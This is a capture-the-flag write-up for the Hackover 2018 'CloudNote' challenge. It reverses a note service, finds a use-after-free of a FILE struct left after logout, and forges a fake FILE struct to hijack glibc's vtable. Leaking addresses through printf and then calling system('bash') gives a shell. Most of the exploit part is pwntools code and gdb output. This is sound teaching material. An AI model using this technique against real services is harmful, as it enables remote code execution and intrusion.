---
title: "CTF Hackover 2018 - Pwn - CloudNote"
description: "A FILE struct use after free"
---

# Description

This is the intended solution for the Hackover 2018 CTF.

```
This lightweight service hosts your notes in the Cloud.
Feel free to test our service with the guest:guest test account.
For optimal security use a recent Ubuntu Xenial or the provided libc.
```

Due to my mistake, the source was not provided.
So the binary has to be reversed in advance, but it was not stripped.
Connecting to the challenge, we get a basic cli, for managing notes.
Any invalid command results in the following help message:


```
  ____ _                 _ _   _       _
 / ___| | ___  _   _  __| | \ | | ___ | |_ ___
| |   | |/ _ \| | | |/ _` |  \| |/ _ \| __/ _ \
| |___| | (_) | |_| | (_| | |\  | (_) | ||  __/
 \____|_|\___/ \__,_|\__,_|_| \_|\___/ \__\___|

-----------------------------------------------
Because it's a great Idea!
cmd>
login           log in as user
register        register new user
note show       show your notes
note add        add new note
note delete     delete yout note
logout          safely logout
quit            quit session
cmd>
```

For each command, there is one handler function defined, that is called by `main()`;
Decompiling the login function in hopper reveals the following annotated code


<button class="collapsible">Show Source</button>
<div class="collapsibleContent" markdown="1">
```c
void login(void * __entry) {
    var_18 = *0x28;
    // The login check is based on the content of the user pointer
    if (*user != 0x0) {
            puts("ERROR: already logged in");
    }
    else {
            username = 0x0;
            printf("Username: ");
            fflush(*stdout@@GLIBC_2.2.5);
            rax = getline(&username, 0x6020e0, *stdin@@GLIBC_2.2.5);
            *(int8_t *)((strlen(username) - 0x1) + username) = 0x0;
            if (strchr(username, 0x2f) != 0x0) {
                    puts("ERROR: invalid username");
                    free(username);
            }
            else {
                    filename = malloc(strlen(username) + 0x4);
                    *(int32_t *)filename = 0x2f6264; // "db/"
                    strcat(filename, username);
                    if (access(filename, 0x0) == -1) {
                            puts("ERROR: user does not exist");
                            free(filename);
                            free(username);
                    }
                    else {
                            file_content = 0x0;
                            password = 0x0;
                            printf("Password: ");
                            fflush(*stdout@@GLIBC_2.2.5);
                            rax = getline(&password, 0x6020e0, *stdin@@GLIBC_2.2.5);
                            *(int8_t *)((strlen(password) - 0x1) + password) = 0x0;
                            *user = fopen(filename, 0x4013fa); //user = fopen("db/username");
                            rax = getline(&file_content, 0x6020e0, *user);
                            *(int8_t *)((strlen(file_content) - 0x1) + file_content) = 0x0;
                            free(filename);
                            if (strcmp(file_content, password) != 0x0) {
                                    puts("ERROR: invalid password");
                                    fclose(*user);
                                    *user = 0x0;
                                    free(username);
                                    free(password);
                                    free(file_content);
                            }
                            else {
                                    puts("Succsess");
                                    free(username);
                                    free(password);
                                    free(file_content);
                            }
                    }
            }
    }
    rax = var_18 ^ *0x28;
    if (rax != 0x0) {
            __stack_chk_fail();
    }
    return;
}

```
</div>

So the login status is checked using the `user` pointer which is the result of `fopen` and therefore a `FILE` struct.
The logout handler on the other hand will close this handler but not reset user to `NULL`.

```c
int logout(void * __ut_line) {
    if (*user != 0x0) {
            fclose(*user);
    }
    rax = puts("Succsess");
    return rax;
}
```

Other functions like `note_add` or `note_show`, therefore can't know, if the pointer is still valid or not.
Let's do a little experiment:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *f = fopen("/dev/null", "w");
    printf("%p\n", f);
    fclose(f);

    void *ptr = malloc(32);
    printf("%p\n", ptr);
    free(ptr);

    char *s = NULL;
    size_t n;
    getline(&s, &n, stdin);

    printf("%p\n", ptr);
}
```

This program will generate the following output:

```
$ echo "some random data" | ./a.out                                                                   
0x1b25010
0x1b25010
0x1b25010
```

This shows, that the `FILE` struct is stored on the heap.
Therefore wa have a classic heap-based use after free condition: the `FILE` struct might be overwritten by other methods like `getline()`.
E.g. if the user tries to add a long note after logout, the application segfaults.

The `FILE` struct contains a pointer to a jump table, that holds handlers for various operations(read, write, seek, etc.), the corresponding `_IO_FILE` (type definition in 'bits/types/FILE') struct is defined in `libio.h`.
The goal is to control those handlers, similar to a buffer overflow condition.
A similar exploit is described [here](https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/) and [here](http://www.ouah.org/fsp-overflows.txt) in detail.

# RIP Control

First we have to trigger the UAF.
At this point a peda pattern is helpfull, to see what we have under control.
```
  ____ _                 _ _   _       _       
 / ___| | ___  _   _  __| | \ | | ___ | |_ ___ 
| |   | |/ _ \| | | |/ _` |  \| |/ _ \| __/ _ \
| |___| | (_) | |_| | (_| | |\  | (_) | ||  __/
 \____|_|\___/ \__,_|\__,_|_| \_|\___/ \__\___|
                                               
-----------------------------------------------
Because it's a great Idea!
cmd> login
Username: guest
Password: guest
Succsess
cmd> logout
Succsess
cmd> note add
note> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)A..........
[...]
Stopped reason: SIGSEGV
0x00007ffff7a82f20 in __GI_fseek (fp=0x6039d0, offset=0x0, whence=0x2) at fseek.c:35
[...]
gdb-peda$ pattern search
[...]
Registers point to pattern buffer:
[RDI] --> offset 288 - size ~203
```

The Programm will crashes and a quick look at the registers shows, that `$rdi` points at offset 288 of our buffer, which seem to be the start of our `FILE` struct.

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
exploit = "A" * 288 + fstruct
```
Lets have a closer look at the actual crash
```
   0x7f80dd35489e <fseek+14>:   jne    0x7f80dd3548f9 <fseek+105>
   0x7f80dd3548a0 <fseek+16>:   mov    r8,QWORD PTR [rdi+0x88]
   0x7f80dd3548a7 <fseek+23>:   mov    r10,QWORD PTR fs:0x10
=> 0x7f80dd3548b0 <fseek+32>:   cmp    r10,QWORD PTR [r8+0x8]
   0x7f80dd3548b4 <fseek+36>:   je     0x7f80dd3548f4 <fseek+100>
   0x7f80dd3548b6 <fseek+38>:   mov    esi,0x1
   0x7f80dd3548bb <fseek+43>:   cmp    DWORD PTR [rip+0x332e1e],0x0        # 0x7f80dd6876e0 <__libc_multiple_threads>
   0x7f80dd3548c2 <fseek+50>:   je     0x7f80dd3548cd <fseek+61>

gdb-peda$ pattern search
Registers contain pattern buffer:
r8+0 found at offset 136
```

This is a pointer to `_IO_FILE._lock` and should point to a writable location containing 0x00.
We choose a random address in the BSS segment containing lots of zeros.
```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
exploit = "A" * 288 + fstruct
```
```
   0x7f252345533e <_IO_seekoff_unlocked+30>:    js     0x7f25234553b0 <_IO_seekoff_unlocked+144>
   0x7f2523455340 <_IO_seekoff_unlocked+32>:    je     0x7f2523455379 <_IO_seekoff_unlocked+89>
   0x7f2523455342 <_IO_seekoff_unlocked+34>:    mov    rax,QWORD PTR [rdi+0xa0]
=> 0x7f2523455349 <_IO_seekoff_unlocked+41>:    cmp    QWORD PTR [rax+0x40],0x0
   0x7f252345534e <_IO_seekoff_unlocked+46>:    je     0x7f2523455379 <_IO_seekoff_unlocked+89>
   0x7f2523455350 <_IO_seekoff_unlocked+48>:    cmp    edx,0x1
   0x7f2523455353 <_IO_seekoff_unlocked+51>:    je     0x7f2523455436 <_IO_seekoff_unlocked+278>
   0x7f2523455359 <_IO_seekoff_unlocked+57>:    mov    rdi,rbx
gdb-peda$ pattern search
Registers contain pattern buffer:
RAX+0 found at offset: 160  
[...]
```
Lets set this pointer to the same location and see what happens:
```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
exploit = "A" * 288 + fstruct
```
```
   0x466904 <_IO_seekoff_unlocked+84>:  mov    rsi,QWORD PTR [rsp]
   0x466908 <_IO_seekoff_unlocked+88>:  mov    rax,QWORD PTR [rbx+0xd8]
   0x46690f <_IO_seekoff_unlocked+95>:  mov    rdi,rbx
=> 0x466912 <_IO_seekoff_unlocked+98>:  mov    rax,QWORD PTR [rax+0x48]
   0x466916 <_IO_seekoff_unlocked+102>: add    rsp,0x10
   0x46691a <_IO_seekoff_unlocked+106>: pop    rbx
   0x46691b <_IO_seekoff_unlocked+107>: jmp    rax
   0x46691d <_IO_seekoff_unlocked+109>: nop    DWORD PTR [rax]
gdb-peda$ pattern search
Registers contain pattern buffer:
RAX+0 found at offset: 216
[...]
Registers point to pattern buffer:
[RDI] --> offset 0 - size ~142
```
The code will now jump to `rax+0x48` which is copied from offset 216 in our buffer!
In addition `rdi` also points to our forged `FILE` struct, so we can also controll the first argument.
Lets write a pointer to `printf@got-0x48` at offset 216:

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(got_printf-0x48))
exploit = "A" * 288 + fstruct
```

```
note> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)A..........
AAA0X0.0000000E6C4BP-1...............
cmd>
```

Nice! The code prints our `FILE` struct directly on the screen.

# Exploit
We can now replace our peda pattern with lots of `%p|` to leak the heap and libc base.

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = "%p|" * 64
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(got_printf-0x48))
exploit = "A" * 288 + fstruct
```

```
note> %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|.............
(nil)|0x2|0x3|0x6020f0|(nil)|0x2454420|0x401037|0x24554b0|0x6dde37d37eab4000|0x7ffc1f28a680|...
|0x1c|0x1|0x7ffc1f28afce|%`cmd>
```

As we broke ASLR, we are now ready to execute `system()` in the second stage.
This time, we have to replace the call to `printf()` with a call to `system()`.
As the adress of `system();` is not in memory, we have to write it to an unsed location in the `FILE` struct.
We can use the beginning of our `FILE` struct to pass any argument.

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = "%p|" * 64
fstruct = set_data(fstruct, 0, "bash\x00")
fstruct = set_data(fstruct, 32, pwn.p64(libc + system_offset))
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(heap + 5616 - 0x48))
exploit = "A" * 288 + fstruct
```
And we got a shell ;)

```
cat flag
hackover2018{4lw4y2_Null_y0uR_P01Nt3R}
```


# Files
- [exploit.py](exploit.py)
- [cloudnote.c](cloudnote.c)
- [cloudnote](cloudnote)
- [libc.so.6](libc.so.6)
- [ld-2.23.so](ld-2.23.so)
- [Dockerfile](Dockerfile)
- [Makefile](Makefile)
